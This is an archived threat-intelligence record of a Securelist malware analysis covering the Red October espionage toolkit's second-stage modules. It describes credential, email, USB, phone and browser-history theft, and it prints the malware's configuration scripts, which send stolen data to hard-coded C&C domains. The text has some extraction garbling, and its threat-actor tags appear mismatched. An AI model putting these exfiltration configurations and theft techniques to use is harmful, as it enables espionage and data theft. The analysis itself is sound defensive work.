{
    "id": "ba5ca82f-4c85-4bb8-9ea8-780b7dff145f",
    "created_at": "2022-10-25T16:48:14.926565Z",
    "updated_at": "2025-03-27T02:05:54.568951Z",
    "deleted_at": null,
    "sha1_hash": "e2b327a479a7e3c4fa7a3a34782bf7bca51f597d",
    "title": "“Red October”. Detailed Malware Description 2. Second Stage of Attack",
    "authors": "",
    "file_creation_date": "2018-12-21T03:32:59Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 502410,
    "plain_text": "# “Red October”. Detailed Malware Description 2. Second Stage of Attack\n\n**[securelist.com/red-october-detailed-malware-description-2-second-stage-of-attack/36842/](https://securelist.com/red-october-detailed-malware-description-2-second-stage-of-attack/36842/)**\n\nGReAT\n\n## First stage of attack\n\n Second stage of attack\n\n 1. Modules, general overview\n\n### Module framework\n\nThe main component of Sputnik implements a framework for executing the “tasks” that are\nprovided by its C&C servers.\n\nMost of the tasks are provided as one-time PE DLL libraries that are received from the\nserver, executed in memory and then immediately discarded.\n\nSeveral tasks need to be constantly present, i.e. waiting for the iPhone or Nokia mobile to\nconnect. These tasks are provided as PE EXE files and are installed to the infected\nmachine.\n\n### Persistent tasks\n\nOnce a USB drive is connected, search and extract files by mask/format, including\ndeleted files. Deleted files are restored using a built in file system parser\nWait for an iPhone or a Nokia phone to be connected. Once connected, retrieve\ninformation about the phone, its phone book, contact list, call history, calendar, SMS\nmessages, browsing history\nWait for a Windows Mobile phone to be connected. Once connected, infect the phone\nwith a mobile version of the Sputnik main component\nWait for a specially crafted Microsoft Office or PDF document and execute a\nmalicious payload embedded in that document, implementing a one-way covert\nchannel of communication that can be used to restore control of the infected\nmachine\nRecord all the keystrokes, make screenshots\nExecute additional encrypted modules according to a pre-defined schedule\nRetrieve e-mail messages and attachments from Microsoft Outlook and from\nreachable mail servers using previously obtained credentials\n\n### One-time tasks\n\nCollect general software and hardware environment information\n\n\n-----\n\nretrieve files by mask provided by the C&C server\nCollect information about installed software, most notably Oracle DB, RAdmin, IM\nsoftware including Mail.Ru agent, drivers and software for Windows Mobile, Nokia,\nSonyEricsson, HTC, Android phones, USB drives\nExtract browsing history from Chrome, Firefox, Internet Explorer, Opera\nExtract saved passwords for Web sites, FTP servers, mail and IM accounts\nExtract Windows account hashes, most likely for offline cracking\nExtract Outlook account information\nDetermine the external IP address of the infected machine\nDownload files from FTP servers that are reachable from the infected machine\n(including those that are connected to its local network) using previously obtained\ncredentials\nWrite and/or execute arbitrary code provided within the task\nPerform a network scan, dump configuration data from Cisco devices if available\nPerform a network scan within a predefined range and replicate to vulnerable\nmachines using the MS08-067 vulnerability\nReplicate via network using previously obtained administrative credentials\n\n### Module Groups\n\n**Group**\n\n**name** **Descrition**\n\nRecon Modules of this group designed to be used during first stage of cyberattack right after\ninitial infiltration. Their main purpose is to collect general information about target\nsystem which helps locate and identify the infected machine, estimate potential value of\ncurrent computer data and define which other modules should be pushed next. Also,\nthese modules collect initial easy-to-get type of information such as browser history,\nbrowser cached credentials and FTP client settings.\n\nPassword This group of modules is designed to steal credentials from various applications and\nresources, from Mail.ru Agent (popupal free app from mail.ru) to MS Outlook credentials\nand Windows account hashes (including cached Windows Domain account hashes).\nCapable of using low-level and direct disk access to copy protected files.\n\nEmail This group serves stealing emails from local MS Outlook storage or remote POP3/IMAP\nmail server. It’s capable of dumping full email bodies with headers, saving attachments\nwith predefined file extensions.\n\nUSB drive This group is used to steal files from attached USB devices. It monitors USB device\nevents and starts every time new device is attached. It can copy files from predefined\nextension list, size and age. This group capable of recognition, restoration and copying\nalready deleted files of MS Office document formats by using own FAT-based filesystem\nparser.\n\nKeyboard This group is dedicated to recording keystrokes, grabbing text from password input\nfields and making screencaptures.\n\nPersistence Current group contains installer and payload code to plant a plugin in popular\napplications such as MS Office or Adobe Reader. The backdoor code is activated when\nspecially crafted document is opened on target machine. This is used to regain lost\naccess on a machine in case of unexpected loss of control (C&C server takedown or\nlocal malware cleaning).\n\n\n-----\n\nand then infect via MS08-067 or a list of stolen admin credentials. A module from this\ngroup is capable of dumping Cisco network router configuration via SNMP commands\nand embedded TFTP server.\n\nMobile Mobile group is used to dump all valuable information about locally attached mobile\ndevice. It is capable of copying contact information, calendars, SMS and Emails\ndatabases and many other private data. These modules are capable of checking if a\ndevice was jailbroken.\n\nExfiltration While some of other modules work in “offline” mode, collect and store data locally, this\ngroup of modules transfers all collected data to the C&C server. Modules of this group\nare capable of reaching FTP servers, remote network shares as well as local disk drives\nand copy files from these resources. Unlike Recon data collection modules these\nmodules are designed to run repeatedly and bring only new valuable data.\n\n### Missing Modules\n\n**Group**\n\n**name** **Descrition**\n\n\nUSB\nInfection\n\n\nThere are modules that copy data files (such as execution logs) related to current malware\nfamily from USB drives. However, we haven’t seen a module to infect the USB drives yet. We\nsuspect that this module is capable of infecting removable storage, running arbitrary\nmodules from other groups and save data back to the USB drives.\n\n\n### Module comparison table\n\n\n-----\n\n## 2. Recon group\n\n### RegConn module\n\nKnown variants:\n\n**MD5** **Size** **Compilation date (payload)**\n\n5447848f3a5fdaf97c498190ed501620 167,936 bytes October 22nd, 2011\n\n#### Summary\n\n\n-----\n\napplication launch timestamps, enumerates attached usb devices like mobile phones and\nlooks for software from this devices, checks for presence of custom enterprise software,\nmaintains unfinished/unreferenced download+execute functionality, sends encrypted\ncollected data at one of C&C servers (i.e. nt-windows-online.com;nt-windowsupdate.com;nt-windows-check.com).\nThis module is a Win32 Dll file. C runtime and several other libs statically linked into the\nexecutable with various optimizations enabled. All functionality is in DllMain function, no\nexport names defined. Compiled with MS Visual C++ 2005.\n\n#### Sequence of systems monitoring tasks\n\n1. Gathers startup information, select environment variables and values %windir%,\n\n%username%, %userdomain%, %computername%)\n2. Opens target directory c:windowsprefetch, records all entries in the directory of\n\napplications recently run along with timestamp, i.e.\nPREFETCH DEFRAG.EXE-273F131E.pf.2012-10-31 18:32:37\nPREFETCH DUMPBIN.EXE-0751B17C.pf.2012-11-01 23:45:39\n\n3. Loops through registry, attempts to access and record all recently used application\n\ndata, i.e.\nC:Program FilesCommon FilesJavaJava Updatejusched.exe, REG_SZ, Java(TM)\nUpdate Scheduler\nC:Documents and SettingspLocal SettingsApplication\nDataGoogleUpdateGoogleUpdate.exe, REG_SZ, Google Installer\nC:Program FilesMessengermsmsgs.exe, REG_SZ, Windows Messenger\n\n4. Attempts to access and record a set of hardcoded registry keys related to enterprise\n\nsoftware. Attempts to access and record related keys and values. Reports on\nsuccess and failure of related key and value access, i.e.\nREG ORACLE* CHECK\n(1) SoftwareOracleSun\nRayClientInfoAgentDisconnectActions@Default -> REG_SZ:””\n(1) SoftwareOracleSun RayClientInfoAgentReconnectActions\n@Default -> REG_SZ:””\n5. Attempts to access and record all registry keys and values related to context menu\n\nhandlers and related executable pathnames, i.e.\nContext MENU *shellexContextMenuHandlers7-Zip\n(1) *shellexContextMenuHandlers7-Zip@Default -> REG_SZ: “{23170F69-40C1-278A1000-000100020000}”\n(1) CLSID{23170F69-40C1-278A-1000-000100020000}@Default -> REG_SZ: “7-Zip\nShellExtension”\n(1) CLSID{23170F69-40C1-278A-1000-000100020000}InprocServer32@Default ->\nREG_SZ: “C:Program Files7-Zip7-zip.dll”\n(2) CLSID{23170F69-40C1-278A-1000\n\n-----\n\n6. Attempts to access and record registry keys and values related to auto-start\n\napplications enumerated under the HKCU Run key and all HKLMUserinit registry keys,\ni.e.\nHKCU Run\n(1) SOFTWAREMicrosoftWindowsCurrentVersionRunVBoxTray ->\nREG_SZ: “C:WINDOWSsystem32VBoxTray.exe”\n(2) SOFTWAREMicrosoftWindowsCurrentVersionRunSunJavaUpdateSched –\n\n  - REG_SZ: “C:Program FilesCommon FilesJavaJava Updatejusched.exe”\n\n7. Attempts to access and record registry keys and values enabling email and webmail\n\naccess under HKCUSoftwareVB and VBA Program SettingsWebmailer, MSOffice\nsettings, and HKCUSoftwareMail.ruAgentAgent, i.e.\nREG_MRA Run\n(1) SoftwareMail.RuAgentAgent -> REG_SZ: “1”\n\n8. Attempts to access and record registry keys and values related to hardcoded list of\n\nattached mobile devices and also general USB devices and mobile synchronization\nand contact software. Reports on success and failure of related key and value\naccess, i.e.\nN2 Run\nERROR: can’t make RegOpenKey for SoftwareNokiaPC Suite at 412: 0\nMSG: The operation completed successfully\n\n9. Attempts to access and record registry keys and values related to list of all installed\n\nsoftware. Reports on success and failure of related key and value access, i.e.\nREG_SPEC_SSS_B Run\n(1) SOFTWAREClassesInstallerProductsB79C053C7D38M\nEE4AB9A00CB3B5D2472ProductName -> REG_SZ: “WebFldrs XP”\n\n10. Attempts to access and record registry keys and values indicating the presence of\n\nRadmin v2.0 remote control software, i.e.\nRadmin Run\nERROR: can’t make RegOpenKey for SYSTEMRAdminv2.0ServerParameters at 412: 0\nMSG: The operation completed successfully\n\n11. Attempts to open Firefox prefs.js and profiles.ini configuration files. Attempts to\n\nopen Opera profile.ini, profile/Opera6.ini configuration files. Reads these files and\nidentifies network proxies for each along with credential information. Retrieves\nInternet Explorer proxy preferences from the registry.\n12 Searches for the following file types in the registry and corresponding handler and\n\n\n-----\n\n.str .tte ._ok .ki .tel .tlg .zfc .encrypted .zm9 .dat\n\n.crp .pcr .safe .ldf\n\nAs a part of the network activity loop, calls GetWindowsDirectoryA, GetDriveTypeA\nand GetVolumeInformation each time, collects hardware information most likely for\nunique identification. Attempts to resolve nt-windows-update.com domain name.\nFollowing a successful call and return from WS2_32.WSAStartup and prior to\nWS2_32.gethostbyname, the collected data is encrypted.\nAttempts to connect to nt-windows-online.com. POSTs encrypted data to ntwindows-online.com/cgi-bin/nt/sk/ .\nIf POST to nt-windows-online.com fails, attempts the same process with nt-windowscheck.com, nt-windows-update.com domains.\nIf no connections are made, attempts to use configured web browser proxy settings\nand uses them to connect to the three hard-coded domains listed above.\nConnects and POSTs the stolen configuration data.\nMaintains download and execute code. How this functionality is called at runtime is\nuncertain. There are no references to it at runtime, so it seems like something is\nmissing or unfinished.\n\n#### Hardcoded registry keys:\n\nHKCUSoftwareMicrosoftWindowsShellNoRoamMUICache\nHKLMSoftwareOracle\nHKCUSoftwareCIT\nHKCUSoftwareCIT Software\nHKLMSoftware\nHKLMSoftwareBaw\nHKLMSoftwareBaw2\nHKLMSOFTWAREMicrosoftWindowsCurrentVersionRun\nHKCR*shellexContextMenuHandlers\nHKCRCLSID\n\nHKLMSOFTWAREMicrosoftWindows NTCurrentVersionWinlogon\nHKCUSOFTWAREVB and VBA Program SettingsWebMailer\nHKCUSoftwareMicrosoftOffice12.0CommonGeneral\nHKCUSoftwareMail.RuAgent\nHKLMSOFTWAREClassesInstallerProducts\nHKLMSOFTWAREMicrosoftWindowsCurrentVersionSetup\nHKCUSOFTWAREMicrosoftWindows CE Services\nHKLMSOFTWAREMicrosoftWindows NTCurrentVersionWindows\nHKLMSoftwareNokia\nHKLMSoftwareHTC\nHKLMSystemCurrentControlSetControlDeviceClasses\n\n\n-----\n\nHKLMSystemControlSet001EnumRootWPD000\nHKLMSYSTEMCURRENTCONTROLSETENUMUSB\nHKLMSYSTEMRAdmin\n\n### Wnhttp module\n\nKnown variants:\n\n**MD5** **Compilation date (payload)**\n\n1b840c5b45cd015f51010e12938b528a 2012.09.05 07:02:33 (GMT)\n\n65820769534fec10958573d1c8a545a8 2012.09.05 07:02:33 (GMT)\n\n#### Summary\n\nThe file is a PE DLL file without exported functions, compiled with Microsoft Visual Studio\n2010. Known samples share one code section, but contain different payloads in the\nresource section.\nAll the functionality is implemented in the DllMain function.\n\nThis module is a plugin to check Internet connectivity and get an external IP address of\ncurrent system using popular public services such as 2ip.ru, myip.ru, smart-ip.net.\n\n#### DllMain\n\nThe module collects basic system information such as current computer name, current\nusername, and path to the original executable module where it started from. It creates a\nunique identifier of current system based on VolumeSerialNumber property of the disk\nwhere current Windows system is located or a hash of current computer name and\nProductID value of Internet Explorer from\n\nHKLMSOFTWAREMicrosoftInternet ExplorerRegistrationProductID. This information is put\nin the log file in the first place along with current date and time.\n\nThis module loads a config/script from local resource AAA and sends out some network\nrequests using standard WinInet API. The config/script AAA has the following contents:\n\nSetOption(conn_a.D_CONN, [65] “nt-windows-online.com;nt-windows-update.com;ntwindows-check.com”)\nSetOption(conn_a.D_NAME, [15] “/cgi-bin/nt/sk”)\nSetOption(conn_a.D_RPRT, [3] “80”)\nSetOption(conn_a.D_SPRT, [3] “80”)\nSetOption(conn_a.D_USER, [21] “%removed%”)\nSetOption(conn_a.D_MODE, 0x0033)\nSetOption(conn_a.D_PASS, 0x00)\nSetOption(conn_a.J_CONN, [65] “nt-windows-online.com;nt-windows-update.com;ntwindows-check.com”)\nSetOption(conn_a.J_NAME, [15] “/cgi-bin/nt/th”)\n\n\n-----\n\nSetOption(conn_a.J_SPRT, [3] 80”)\nSetOption(conn_a.J_MODE, 0x0033)\nSetOption(conn_a.J_PASS, 0x00)\nSetOption(conn_a.VERSION_ID, [6] “51070”)\nSetOption(conn_a.SEND_DELAY_TIME, [6] “20000”)\nSetOption(conn_a.VER_SESSION_ID, [11] “%removed%”)\nSetOption(http_host, [7] “2ip.ru“)\nSetOption(http_port, [3] “80”)\nSetOption(http_path, 0x002F)\nSetOption(http_ua, [68] “Mozilla/5.0 (Windows NT 5.1; rv:5.0.1)\nGecko/20100101 Firefox/5.0.1”)\nSetOption(http_headers, [177] “Accept:\ntext/html,application/xhtml+xml,application/xml;q=0.9,\n*/*;q=0.8 Accept-Language: en-us;q=0.5,en;q=0.3 Accept-Encoding:\ngzip, deflate Accept-Charset: utf-8;q=0.7,*;q=0.7”)\nCall(task_http)\nSetOption(http_host, [12] “www.myip.ru“)\nSetOption(http_port, [3] “80”)\nSetOption(http_path, 0x002F)\nSetOption(http_ua, [68] “Mozilla/5.0 (Windows NT 5.1; rv:5.0.1)\nGecko/20100101 Firefox/5.0.1”)\nSetOption(http_headers, [177] “Accept:\ntext/html,application/xhtml+xml,application/xml;q=0.9,\n*/*;q=0.8 Accept-Language: en-us;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate AcceptCharset: utf-8;q=0.7,*;q=0.7”)\nCall(task_http)\nSetOption(http_host, [13] “smart-ip.net“)\nSetOption(http_port, [3] “80”)\nSetOption(http_path, 0x002F)\nSetOption(http_ua, [68] “Mozilla/5.0 (Windows NT 5.1; rv:5.0.1)\nGecko/20100101 Firefox/5.0.1”)\nSetOption(http_headers, [177] “Accept:\ntext/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: enus;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Accept-Charset: utf-8;q=0.7,*;q=0.7”)\nCall(task_http)\n\nWhile “conn_a” parameters are used to access C&C server during reporting stage, other\nparameters which start with “http_” are used to send out http requests. Target hosts as\nshown above are\n\n1. 2ip.ru\n2. www.myip.ru\n3. smart-ip.net\n\n\n-----\n\nmachine is behind proxy or NAT router, the IP address might be different from the local\none. Interestingly all websites of current module developers’ choice are obviously owned by\nRussian-speaking people from former CIS countries, first two seem to be Russian and last\none is Ukrainian.\n\nThe module simply sends HTTP GET requests to the root page of the websites and gets\nthe response code from the headers as well as html/text source of the webpage, which is\nlater uploaded to the C&C.\n\nCurrent module doesn’t create any local logs, instead all information is kept in memory,\nwhich is later compressed using Zlib 1.2.5, encrypted, encoded with Base64 algorithm and\nsubmitted to the C&C server.\n\n### Sysinfo module\n\nKnown variants:\n\n**MD5** **Compilation date**\n\ne36b94cd608e3dfdf82b4e64d1e40681 2012.09.05 09:02:30 (GMT)\n\na2fe73d01fd766584a0c54c971a0448a 2012.09.05 09:02:30 (GMT)\n\nThe files differ only by few values from resources section (which contains configuration\ndata) – code is identical.\n\nThis module is a PE DLL, written in C++, compiled with Microsoft Visual Studio 2010.\n\nDLL resides only in memory – it does not drop itself or any other executables to the disk.\n\nIt creates\n\n%USERPROFILE%Local SettingsTemptmpXX.tmp file (where XX is randomly generated hex\nnumber). During the analysis, the file stayed 0-bytes. Most probably, it’s created for further\ndata logs.\n\nDLL collects a range of information about the computer (including the browsers history).\nThis data is written to the memory, compressed with Zlib deflate() function – which also\nperforms some XOR operations on it – encoded with base64 algorithm and sent by the\nHTTP POST request to the C&C server.\n\n#### Initialization\n\nAfter it is loaded to the memory, malware loads and locks resource BBB:AAA:0000, which\ncontains config information;\n\nIt gets the information about local system and current process:\n\ncomputer name\nuser name\ncurrent module name\n\n\n-----\n\nThen it creates a separate thread, which contains the main module functionality.\n\n#### Main malware thread\n\nFirst, it constructs an internal filename string “ @INFOSYSINFO_%u_%s.bin“\n\nwhere %u is equal to 7 and %s is system time – obtained with use of GetLocalTime and\nSystemTimeToFileTime – in format:\n\n“%04u%02u%02u_%02u%02u%02u_%03u”\n\nif FileTimeToSystemTime failed, it uses the default time string:\n\n“16010101_000000_000”\n\nif wsprintfW failed, it uses the default hardcoded filename:\n\n“@INFOSYSINFO_X_00000000_000000_000.txt”\n\nThen it reads the configuration from the resources section and builds the structure\ncontaining all the necessary information at specific offsets. This structure is held only in\nmemory.\n\nIt contains a resource named “AAA” with the following values in it:\n\nSetOption(conn_a.D_CONN, [65] “nt-windows-online.com;nt-windows-update.com;ntwindows-check.com”)\nSetOption(conn_a.D_NAME, [15] “/cgi-bin/nt/sk”)\nSetOption(conn_a.D_RPRT, [3] “80”)\nSetOption(conn_a.D_SPRT, [3] “80”)\nSetOption(conn_a.D_USER, [21] “%removed%”)\nSetOption(conn_a.D_MODE, 0x0033)\nSetOption(conn_a.D_PASS, 0x00)\nSetOption(conn_a.J_CONN, [65] “nt-windows-online.com;nt-windows-update.com;ntwindows-check.com”)\nSetOption(conn_a.J_NAME, [15] “/cgi-bin/nt/th”)\nSetOption(conn_a.J_USER, [21] “%removed%”)\nSetOption(conn_a.J_RPRT, [3] “80”)\nSetOption(conn_a.J_SPRT, [3] “80”)\nSetOption(conn_a.J_MODE, 0x0033)\nSetOption(conn_a.J_PASS, 0x00)\nSetOption(conn_a.VERSION_ID, [6] “17486”)\nSetOption(conn_a.SEND_DELAY_TIME, [6] “20000”)\nSetOption(conn_a.VER_SESSION_ID, [11] “%removed%”)\n**Call(task_sysinfo)**\n\nMalware main thread calls 2 main subroutines:\n\ni l f i f i i l di b i hi d i i h\n\n\n-----\n\ntakes data from the configuration in resources to connect to the C&C and submit\ncollected data\n\n#### Data collection\n\nMalware collects following information:\n\ncurrent file time\nlocal time\nusername\ncomputer name\nis admin (if the user has administrative rights)\nlanguage\nansi code package\noem code package\ntime zone\ncurrent module name\ncurrent directory\ntemp directory path\nWindows directory path\nsystem directory path\nmajor OS version\nminor OS version\nbuild number\nservice pack number\nplatform id\n\nAdditionally, to obtain default applications for HTTP, HTTPS, HTMLFILE and MAILTO\nmalware uses RegQueryValueEx to check following registry keys under\n\nHKCRttpshellopencommand\nHKCRhttpsshellopencommand\nHKCRhtmfileshellopencommand\nHKCRmailtoshellopencommand\n\nFollowing parameters are retrieved for each disk, including optical drives and shared\nmounts:\n\nroot path\nfilesystem name\nvolume name\ndrive type\nvolume serial number\nfilesystem flags\nmaximum component length\nsectors per cluster\nbytes per sector\n\n\n-----\n\nfree bytes available\ntotal number of bytes\ntotal number of free bytes\n\nThen it collects information about local network adapters:\n\nAdapter Name\nAdapter Description\nAddress Length\nAdapter MAC Address\nAdapter Index\nAdapter Type\nDhcpEnabled\nCurrentIpAddress\nIpAddressList\nGatewayList\nDhcpServer\nHaveWins\nPrimaryWinsServer\nSecondaryWinsServer\nLeaseObtained\nLeaseExpires\n\nThe malware looks for URL history from following browsers:\n\nChrome, Mozilla Firefox, Internet Explorer, Opera\n\n**1. Chrome history:**\n\nBefore the malware is performing the SQL queries on the browsers profile-files, it copies\nthe original file into a temp-file.\n\nTo get the Tempfile path and name it makes use of GetTempPathW and\nGetTempFileNameW with prefix “tmp”.\n\nThe Tempfile will be named like this:\n\ntmpXX.tmp\n\nWhere XX is a 2-digit number starting from 00.\n\nMalware use following SQL query:\n\nSELECT * FROM urls\n\nto extract URLs (with titles, last visited date) from Chrome history database:\n\nGoogleChromeUser DataDefaultHistory\n\n**2. Mozilla history (sub 10015430):**\n\n\n-----\n\nSELECT * FROM moz_places\n\nto extract URLs from Mozilla history database:\n\nMozillaFirefoxProfiles%profilename%places.sqlite\n\nIn both cases, malware performs SQL related actions with use of functions from embedded\nSQL library (most probably parts of sqlite3.dll).\n\n**3. IE history (sub_10014F50):**\n\nMalware calls CoCreateInstance function with following values:\n\nCLSID  3C374A40-BAE4-11CF-BF7D-00AA006946EE Microsoft Url History Service\nRIID   AFA0DC11-C313-11D0-831A-00C04FD5AE38 SID_IUrlHistoryStg2\n\ni.e. it uses IUrlHistory interface to search through the history and calls\nSHDOCVW!CEnumSTATURL to enumerate URLs.\n\nIt also makes use of shdocvw.dll which is responsible to get control over IE. The calladresses are resolved dynamically:\n\n**4. Opera history (sub_10014EB0):**\n\nMalware gets the Opera folder path and searches it for URLs in files:\n\n\n-----\n\nAll above subroutines retrieves URL + Title + Last Visited Time and write them to the\nmemory (after the previous data).\n\nAlso, a DNS resolve is performed on all domain names.\n\nThis module also calls GetEnvironmentStrings to retrieve all environment variables.\n\nIt is also interested in current Windows Domain information\n\nDomainControllerName\nDomainControllerAddress\nDomainControllerAddressType\nDomainGuid\nDomainName\nDnsForestName\nFlags\nDcSiteName\nClientSiteName\n\nThe malware looks for all running processes and all modules loaded into their address\nspace. For each file it retrieves following values from the version info:\n\nStringFileInfo%04x%04xSpecialBuild\nStringFileInfo%04x%04xPrivateBuild\nStringFileInfo%04x%04xProductVersion\nStringFileInfo%04x%04xProductName\nStringFileInfo%04x%04xOriginalFilename\nStringFileInfo%04x%04xLegalTrademarks\nStringFileInfo%04x%04xLegalCopyright\nStringFileInfo%04x%04xInternalName\nStringFileInfo%04x%04xFileVersion\nStringFileInfo%04x%04xFileDescription\nStringFileInfo%04x%04xCompanyName\n\nIt looks for installed programs information by enumerating registry key:\n\nSOFTWAREMicrosoftWindowsCurrentVersionUninstall\n\nFor each entry it retrieves following values:\n\nDisplayName\nDislayVersion\nDisplayIcon\nInstallDate\nUninstallString\nInstallSource\nInstallLocation\n\n\n-----\n\nClass GUID is hardcoded and equals:\n\n{A5DCBF10-6530-11D2-901F-00C04FB951ED}\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2013/2013.01.14.Red_October_Campaign/securelist.com-Red%20October%20Detailed%20Malware%20Description%202%20Second%20Stage%20of%20Attack.pdf"
    ],
    "report_names": [
        "securelist.com-Red October Detailed Malware Description 2 Second Stage of Attack"
    ],
    "threat_actors": [
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716494,
    "ts_updated_at": 1743041154,
    "ts_creation_date": 1545363179,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/e2b327a479a7e3c4fa7a3a34782bf7bca51f597d.pdf",
        "text": "https://archive.orkl.eu/e2b327a479a7e3c4fa7a3a34782bf7bca51f597d.txt",
        "img": "https://archive.orkl.eu/e2b327a479a7e3c4fa7a3a34782bf7bca51f597d.jpg"
    }
}